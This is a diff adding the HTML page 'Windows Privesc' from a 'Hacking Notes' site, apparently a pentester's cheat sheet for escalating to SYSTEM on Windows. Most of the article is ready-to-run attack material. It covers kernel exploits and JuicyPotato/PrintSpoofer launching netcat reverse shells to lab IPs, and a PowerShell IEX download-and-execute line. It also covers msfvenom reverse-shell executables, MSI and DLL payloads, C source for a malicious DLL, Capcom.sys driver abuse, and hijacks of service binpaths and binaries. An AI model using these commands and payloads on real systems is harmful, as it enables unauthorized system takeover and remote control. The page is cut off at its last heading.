@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Windows Privesc | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="Windows Privesc" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Privilege Escalation usually involves going from a lower permission to a higher permission." />
+<meta property="og:description" content="Privilege Escalation usually involves going from a lower permission to a higher permission." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/privilege-escalation/windows-privesc/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/privilege-escalation/windows-privesc/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"Privilege Escalation usually involves going from a lower permission to a higher permission.","url":"http://0.0.0.0:4000/hackingnotes/privilege-escalation/windows-privesc/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Windows Privesc","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Privilege Escalation</h2>
+				<h3>Windows Privesc</h3>
+			</div>
+			<article class="content">
+				<p>Privilege Escalation usually involves going from a lower permission to a higher permission.</p>
+
+<h1 id="enumeration-scripts">Enumeration Scripts:</h1>
+
+<p>There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples:</p>
+
+<ul>
+  <li><strong>PowerUp.ps1:</strong> <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></li>
+  <li><strong>WinPEAS:</strong> <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a> ****</li>
+</ul>
+
+<blockquote>
+  <p><strong>Info</strong>: <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</a></p>
+</blockquote>
+
+<h1 id="kernel-vulnerabilities">Kernel Vulnerabilities</h1>
+
+<p>We can exploit some kernel vulnerabilities in order to privesc.</p>
+
+<blockquote>
+  <p><strong>All Windows Server 2008 R2</strong> without <strong>HOTFIXES</strong> are vulenrable to MS15 and MS16 (MS15-051)</p>
+</blockquote>
+
+<h2 id="sherlockps1">Sherlock.ps1</h2>
+
+<p>Is a powershell script that we can run out of memory in order to find some vulnerabilities.</p>
+
+<p>First we need to modify it and add the following line to the end of the script:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Find-AllVulns
+</code></pre></div></div>
+
+<p>Once added, we just need to start http server and executed directly from powershell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe IEX(New-Object System.Net.Webclient).DownloadString('http://ip-addr:port/Sherlock.ps1')
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1">https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1</a></li>
+</ul>
+
+<h2 id="suggester">Suggester</h2>
+
+<p><code class="highlighter-rouge">windows-exploit-suggester.py</code> or <code class="highlighter-rouge">wesng</code> are amazing scripts that do this work.</p>
+
+<ul>
+  <li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+</ul>
+
+<blockquote>
+  <p><strong>Remember</strong> to update the database.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./windows-exploit-suggester.py --update
+</code></pre></div></div>
+
+<p>We just need to execute <code class="highlighter-rouge">systeminfo</code> and save the output into a file on the windows target machine.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo &gt; systeminfo.txt
+</code></pre></div></div>
+
+<p>Once downloaded to our attacking machine we just need to execute the following command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt
+</code></pre></div></div>
+
+<h2 id="compiling-exploits">Compiling Exploits</h2>
+
+<p>Sometimes we need to compile our exploits in order to get the binary or executable.</p>
+
+<p>For <strong>64-bits:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
+</code></pre></div></div>
+
+<p>For <strong>32-bits:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i686-w64-mingw32-gcc exploit.c -o exploit.exe
+</code></pre></div></div>
+
+<h2 id="ms09-20">MS09-20</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/windows-kernel-exploits/MS09-020/MS09-020-KB970483-CVE-2009-1535-IIS6/IIS6.0.exe
+
+Usage:
+.\IIS6.0.exe "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.15 4444"
+</code></pre></div></div>
+
+<h2 id="ms15-051">MS15-051</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/windows-kernel-exploits/MS15-051/MS15-051-KB3045171/MS15-051.exe
+
+Usage:
+.\ms15-051.exe "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.15 4444"
+</code></pre></div></div>
+
+<h2 id="ms16-032">MS16-032</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/windows-kernel-exploits/MS16-032/x64/ms16-032.exe
+
+Usage:
+.\ms16-032.exe
+</code></pre></div></div>
+
+<h2 id="ms17-010-eternalblue">MS17-010 (EternalBlue)</h2>
+
+<ul>
+  <li><a href="https://github.com/dful/MS17-010">https://github.com/dful/MS17-010</a></li>
+</ul>
+
+<h2 id="comahawk-cve-2019-1405">COMahawk (CVE-2019-1405)</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\COMahawk.exe "C:/windows/temp/rev.exe"
+</code></pre></div></div>
+
+<p>We can check the windows version by using <code class="highlighter-rouge">winver</code> command (GUI needed).</p>
+
+<p><img src="/hackingontes/images/winver.png" alt="winver command" /></p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/47684">https://www.exploit-db.com/exploits/47684</a></li>
+</ul>
+
+<h1 id="windows-xp-sp0sp1---upnphost">Windows XP SP0/SP1 - upnphost</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.10.10.10 4444 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+sc config upnphost depend= ""
+net start upnphost
+</code></pre></div></div>
+
+<p>Maybe it will fail due to missing some dependency, try the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc config SSDPSRV start=auto
+net start SSDPSRV
+net stop upnphost
+net start upnphost
+
+sc config upnphost depend=""
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Alert</strong>: SPACES are mandatory to the work of the exploit.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">https://sohvaxus.github.io/content/winxp-sp1-privesc.html</a></li>
+</ul>
+
+<h1 id="check-privileges">Check privileges</h1>
+
+<p>With the following command we can check the privileges that is assigned to the pwned user:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
+</code></pre></div></div>
+
+<h2 id="seimpersonateprivilege">SeImpersonatePrivilege</h2>
+
+<h3 id="rottenpotato-juicy-potato">RottenPotato (Juicy Potato)</h3>
+
+<p>Juicy Potato is another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM. Is a sugared version of Rotten Potato. <a href="https://github.com/ohpe/juicy-potato">Download the latest realese</a> and execute it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe -e cmd.exe 10.10.14.21 4444" -t *
+</code></pre></div></div>
+
+<h3 id="printspoofer">PrintSpoofer</h3>
+
+<p>One way to gain system user on latest Operative System such as <strong>Windows10 or Server 2016/2019</strong>, is using the printspoofer exploit. <a href="https://github.com/itm4n/PrintSpoofer">Donwload the latest release</a> and execute it on the target machine to gain privs.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PrintSpoofer64.exe -i -c cmd
+</code></pre></div></div>
+
+<h2 id="seloaddriverprivilege">SeLoadDriverPrivilege</h2>
+
+<p>We are able to load a driver, so we can load a vulnerable driver, then exploit it.</p>
+
+<h3 id="load-capcomsys">Load Capcom.sys</h3>
+
+<p>To load the driver we need first to create a <strong>C++ Console APP on Visual Studio</strong> (Not Code!) and paste the following script.</p>
+
+<blockquote>
+  <p><strong>Alert:</strong> Remove line: #include “stdafx.h”</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a></li>
+</ul>
+
+<p><img src="/hackingnotes/images/eoploaddriver.png" alt="EoPLoadDriver.cpp" /></p>
+
+<p>Once compiled With <strong>Release x64</strong> we need to download Capcom.sys driver. (<a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a>)</p>
+
+<p>Copy the driver and the binary to the target machine and execute it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\EoPLoadDriver.exe System\CurrentControlSet\dfserv C:\ProgramData\Capcom.sys
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\dfserv
+NTSTATUS: 00000000, WinError: 0
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>NTSTATUS</strong> codes:</p>
+
+  <p>0xC000003B - <code class="highlighter-rouge">STATUS_OBJECT_PATH_SYNTAX_BAD</code></p>
+
+  <p>0x00000034 - <code class="highlighter-rouge">STATUS_OBJECT_NAME_NOT_FOUND</code></p>
+</blockquote>
+
+<h2 id="exploiting-capcomsys">Exploiting Capcom.sys</h2>
+
+<p>I modified the following project: <a href="https://github.com/tandasat/ExploitCapcom">https://github.com/tandasat/ExploitCapcom</a>. Download the project and open the <code class="highlighter-rouge">ExploitCapcom.sln</code> (Visual Studio Project) with Visual Studio.</p>
+
+<p>Modify the line 410 of <code class="highlighter-rouge">ExpliotCapCom.cpp</code> and compile it.</p>
+
+<p><img src="/hackingontes/images/exploitcapcom.png" alt="ExploitCapcom.cpp" /></p>
+
+<p>Create the exploit.exe payload with msfvenom:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; exploit.exe
+</code></pre></div></div>
+
+<p>And upload all the files and execute the <code class="highlighter-rouge">ExploitCapcom.exe</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\ExploitCapcom.exe
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a></li>
+</ul>
+
+<h1 id="unquoted-service-path">Unquoted Service Path</h1>
+
+<p>Every Windows service has his access route to the executable. If this route is <strong>not quoted</strong> and <strong>contains</strong> <strong>spaces</strong> or others separators like this example <del><em><code class="highlighter-rouge">C:\Program Files\First Folder\myexecutable.exe</code></em></del> , the service will try to access to the resource in the following order:</p>
+
+<ol>
+  <li><em><code class="highlighter-rouge">C:\Program.exe</code></em></li>
+  <li><em><code class="highlighter-rouge">C:\Program Files\First.exe</code></em></li>
+  <li><em><code class="highlighter-rouge">C:\Program Files\First Folder\myexecutable.exe</code></em></li>
+</ol>
+
+<p>If we can put our executable in one of the paths that it is checked before the real route, when we restart the service we will obtain a shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+</code></pre></div></div>
+
+<p>We need to ensure that the service is running by <code class="highlighter-rouge">LocalSystem</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc &lt;service&gt;
+</code></pre></div></div>
+
+<p>Once we’ve found the binaries that are vulnerable to unquoted service path, we need to find where we have permissions to write, for that work we can use <code class="highlighter-rouge">icacls</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Porgram Files"
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Info</strong>: We need to find some with <strong>write</strong> permissions <strong>(W)</strong></p>
+</blockquote>
+
+<p>Once we’ve found the writeable path, we will need to create our malicious binary with <code class="highlighter-rouge">msfvenom</code> and upload in the right directory:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip-addr&gt; LPORT=&lt;port&gt; -f exe -o First.exe
+</code></pre></div></div>
+
+<p>Finally we need to restart the service to gain access to system:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop &lt;service&gt;
+sc start &lt;service&gt;
+</code></pre></div></div>
+
+<h1 id="always-install-elevated">Always Install Elevated</h1>
+
+<p><strong>If</strong> these 2 registers are <strong>enabled</strong> (value is <strong>0x1</strong>), any user can <strong>install <code class="highlighter-rouge">.msi</code> ** files as <code class="highlighter-rouge">NT AUTHORITY\</code></strong><code class="highlighter-rouge">SYSTEM</code>**</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></div></div>
+
+<h2 id="creating-the-malicious-msi-file">Creating the malicious .msi file</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt;-f msi -o shell.msi
+</code></pre></div></div>
+
+<h2 id="executing-the-msi">Executing the .msi</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /quiet /qn /i c:\users\user\documents\shell.msi
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note:</strong> I’d problems while exploiting it via WIN-RM. Try another way to get shell.</p>
+</blockquote>
+
+<h1 id="incorrect-permissions-in-services">Incorrect permissions in services</h1>
+
+<p>A service running as <code class="highlighter-rouge">NT AUTHORITY/SYSTEM</code> with incorrect file permissions might allow to escalate privileges. You can replace the binary, restart the service and get system.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net start
+wmic service list brief
+sc query
+Get-Service
+</code></pre></div></div>
+
+<p>Sometimes services are pointing to writeable folders:</p>
+
+<h2 id="writeable-folders">Writeable Folders</h2>
+
+<p>Check permissions on folders.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;icacls exacqVisionEsm
+icacls exacqVisionEsm
+exacqVisionEsm NT AUTHORITY\NETWORK SERVICE:(RX)
+               S-1-5-21-1861402468-3453913150-4246083462-1001:(RX)
+               BUILTIN\Administrators:(I)(OI)(CI)(F)
+               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+               BUILTIN\Users:(I)(OI)(CI)(RX)
+               NT AUTHORITY\Authenticated Users:(I)(M)
+               NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+</code></pre></div></div>
+
+<p><strong>Permissions:</strong></p>
+
+<ul>
+  <li><strong>Full access (F)</strong>: Change the binary to the malicious one. <code class="highlighter-rouge">PRIV PATH</code></li>
+  <li><strong>Modify access (M)</strong> : Rename the binary to bin.bak and copy the malicious binary to the original path bin.exe. <code class="highlighter-rouge">PRIV PATH</code></li>
+  <li><strong>Read and Execute access (RX)</strong>: Can read and execute, nothing here.</li>
+  <li><strong>Read-only acess (R)</strong>: Only can read, nothing here.</li>
+  <li><strong>Write-only acess (W)</strong>: Only can write, same as (F), change the binary to the malicious one. <code class="highlighter-rouge">PRIV PATH</code></li>
+</ul>
+
+<p><strong>Changing the original binary:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o mal.exe
+
+move .\enterprisesystemmanager.exe .\enterprisesystemmanager.bak
+move C:\Windows\Temp\rev.exe .\enterprisesystemmanager.exe
+</code></pre></div></div>
+
+<p>Check the configuration of the service to see how to restart the service.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc "exacqVision Enterprise System Manager Web Service"
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Restart Manually</strong></li>
+</ul>
+
+<p>If you have sufficient permissions over the service restart it manually.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net stop ServiceName
+net start ServiceName
+</code></pre></div></div>
+
+<ul>
+  <li><strong>AUTO_START enabled</strong></li>
+</ul>
+
+<p>If AUTO_START flag is enabled restart the machine</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shutdown /r
+</code></pre></div></div>
+
+<h2 id="dll-hijacking">DLL Hijacking</h2>
+
+<p>When we have permissions to overwrite the DLL or the DLL is missing we can create ours.</p>
+
+<h3 id="msfvenom">Msfvenom</h3>
+
+<p>A <code class="highlighter-rouge">dll</code> can also be created with <code class="highlighter-rouge">msfvenom</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f dll -o mal.dll
+</code></pre></div></div>
+
+<h3 id="manual-dll">Manual DLL</h3>
+
+<p>The following C code is an example of our malicious <code class="highlighter-rouge">dll</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe c:\Temp\nc.exe -e cmd.exe &lt;IP&gt; &lt;PORT&gt;");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+</code></pre></div></div>
+
+<h3 id="compiling-the-dll">Compiling the DLL</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#x64
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#x86
+i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+</code></pre></div></div>
+
+<h2 id="modifying-the-service">Modifying the service</h2>
+
+<p>Check service permissions with <code class="highlighter-rouge">accesschk</code> from sysinternals.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk -c &lt;service&gt; -l
+</code></pre></div></div>
+
+<p>And finally modify it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop &lt;service&gt;
+sc config &lt;service&gt; binPath="C:\Temp\nc.exe -e cmd.exe &lt;IP&gt; &lt;PORT&gt;"
+sc qc &lt;service&gt; #Check correct assigment 
+sc start &lt;service&gt;
+</code></pre></div></div>
+
+<h1 id="wsl-windows-subsystem-for-linux">WSL (Windows Subsystem for Linux)</h1>
+
+<p>Windows Subsystem for Linux is a compatibility layer for running Linux binary executables natively on Windows 10 and Windows Server 2019.</p>
+
+<p>Location:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\wsl.exe
+</code></pre></div></div>
+
+<p>Executing <code class="highlighter-rouge">wsl.exe</code> we can get a subsystem shell (Linux) or we can search the subsystem fileroot on the windows machine.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\User\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\
+</code></pre></div></div>
+
+<p>Inside the Linux filesystem as root, you can search for passwords or some other interesting things.</p>
+
+<h1 id="from-administrator-to-system">From Administrator to System</h1>
+
